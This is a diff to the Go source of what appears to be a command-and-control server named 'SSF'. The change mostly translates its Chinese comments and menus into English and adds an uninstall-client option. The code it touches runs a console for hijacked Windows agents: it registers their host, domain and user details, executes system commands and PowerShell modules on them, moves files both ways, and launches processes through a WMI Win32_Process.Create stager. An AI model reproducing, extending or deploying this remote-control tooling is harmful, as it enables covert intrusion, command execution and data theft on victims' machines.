@@ -23,19 +23,20 @@ import (
 )
 
 const help_shell = `
-		help   帮助参数
-   		info   列出操作系统参数
-        load   加载Moudle下的ps1 文件
-        upload 上传文件
-		back   返回主页
+		help   Help menu
+   		info   List os Info
+        	load   load Moudle ps1 file
+                upload upload info
+		back   return Home
+		exit   Uninstall client  
 	 `
 const help = `
-    	help          帮助参数                   
-        set Host      设置IP            
-        session list  列出会话列表                     
-        Interact      使用session ID 
-        shell         进入shell             
-	exit          退出                   
+     	help          Help menu                   
+        set Host      Setting IP address           
+        session list  List os Info                     
+        Interact      Use session ID 
+        shell         Shell => powershell.exe            
+	exit          Exit the program                   
 	 `
 
 var (
@@ -158,7 +159,7 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 		AGENTS[id] = data
 		fmt.Println(data)
 
-		//md执行命令
+		//md执行命令  md=> Execute system command
 	} else if url_cm.MatchString(r.URL.Path) {
 		url_path, _ := regexp.Compile(`[A-Z]+`)
 		var id = url_path.FindString(r.URL.Path)
@@ -192,7 +193,7 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 		decodestr := string(decoded)
 		fmt.Println(decodestr)
 
-		//load加载ps模块
+		//load加载ps模块 re=> load moudle powershell file
 	} else if url_md.MatchString(r.URL.Path) {
 		web_data := r.Form.Get("data")
 		file_data, err := ioutil.ReadFile("./Modules/" + web_data)
@@ -204,7 +205,7 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 			fmt.Fprintf(w, string(file_data))
 		}
 
-		//up客户端下载文件
+		//up客户端下载文件   up=> download file to Client
 	} else if url_up.MatchString(r.URL.Path) {
 		web_data := r.Form.Get("data")
 		file_data, err := ioutil.ReadFile("./file/" + web_data)
@@ -217,7 +218,7 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 			fmt.Fprintf(w, (encodeString))
 		}
 
-		//img上传文件到服务端
+		//img上传文件到服务端   img=> upload file to server
 	} else if url_img.MatchString(r.URL.Path) {
 		web_data := r.Form.Get("data")
 		decoded, _ := base64.StdEncoding.DecodeString(replace(web_data))
@@ -277,7 +278,7 @@ var rtrnCode=GetObject('winmgmts:').Get('Win32_Process').Create(cm,'c:\\',w32ps,
 	}
 }
 
-//打印全部主机信息
+//打印全部主机信息  Print all host information
 func info_os() {
 
 	for k, v := range AGENTS {
@@ -288,13 +289,13 @@ func info_os() {
 		hostname = info[3]
 		domain = info[4]
 		username = info[5]
-		//定义 info 信息中的变量
+		//定义 info 信息中的变量 Define variables in info
 		data := [][]string{
 			[]string{k, OS, IP, Arch, hostname, domain, username},
 		}
-		//将info信息做成表格
+		//将info信息做成表格  Information Form
 		table := tablewriter.NewWriter(os.Stdout)
-		table.SetHeader([]string{"ID", "操作系统版本", "IP地址", "x86 OR x64", "主机名", "域名", "用户名"})
+		table.SetHeader([]string{"ID", "Os Version", "IP Address ", "x86 OR x64", "ComputerName", "domain", "Username"})
 
 		for _, v := range data {
 			table.Append(v)
@@ -390,7 +391,7 @@ func Scanf(a *string) {
 
 		fmt.Println(help_shell)
 		return
-		//帮助参数
+		//帮助参数  help
 	} else if string(data) == "back" {
 		*a = ""
 		back = "back"
@@ -415,14 +416,14 @@ func clear() {
 	//定义系统清屏clear()
 }
 
-func completer(in prompt.Document) []prompt.Suggest { //一级菜单栏列表
+func completer(in prompt.Document) []prompt.Suggest { //一级菜单栏列表 First-level menu bar list
 	s := []prompt.Suggest{
-		{Text: "help"},
-		{Text: "set Host"},
-		{Text: "session list"},
+		{Text: "help", Description: "Help menu"},
+		{Text: "set Host", Description: "Setting IP address "},
+		{Text: "session list", Description: "List os Info"},
 		{Text: "Interact", Description: "Interact with AGENT"},
-		{Text: "shell"},
-		{Text: "exit"},
+		{Text: "shell", Description: "shell => powershell.exe"},
+		{Text: "exit", Description: "Exit the program"},
 	}
 	return prompt.FilterHasPrefix(s, in.GetWordBeforeCursor(), true)
 }
@@ -442,10 +443,10 @@ func Session_id(id string) {
 func Options() { //定义tab 下拉菜单选项参数
 	for true {
 		options := prompt.Input("SSF >", completer,
-			prompt.OptionPrefixTextColor(prompt.Red),                 //字体颜色
-			prompt.OptionPreviewSuggestionTextColor(prompt.Black),    //下拉菜单的字体
-			prompt.OptionSelectedSuggestionBGColor(prompt.LightGray), //下拉菜单的字背景
-			prompt.OptionSuggestionBGColor(prompt.DarkGray))          //菜单框背景
+			prompt.OptionPrefixTextColor(prompt.Red),                 //字体颜色 font color
+			prompt.OptionPreviewSuggestionTextColor(prompt.Black),    //下拉菜单的字体  Font for drop-down menu
+			prompt.OptionSelectedSuggestionBGColor(prompt.LightGray), //下拉菜单的字背景  Word background for drop down menu
+			prompt.OptionSuggestionBGColor(prompt.DarkGray))          //菜单框背景 Menu box background
 
 		if options == "shell" {
 			for true {
@@ -476,10 +477,10 @@ func Options() { //定义tab 下拉菜单选项参数
 
 func main() {
 	AGENTS = make(map[string]string)
-	http.HandleFunc("/", httpserver) //设置访问的路由
+	http.HandleFunc("/", httpserver) //设置访问的路由  Set up access routes
 
-	go http.ListenAndServe(":9090", nil) //设置监听的端口
-	clear()                              //系统清屏
+	go http.ListenAndServe(":9090", nil) //设置监听的端口  Set the listening port
+	clear()                              //系统清屏  system clear
 	Options()
 
 }
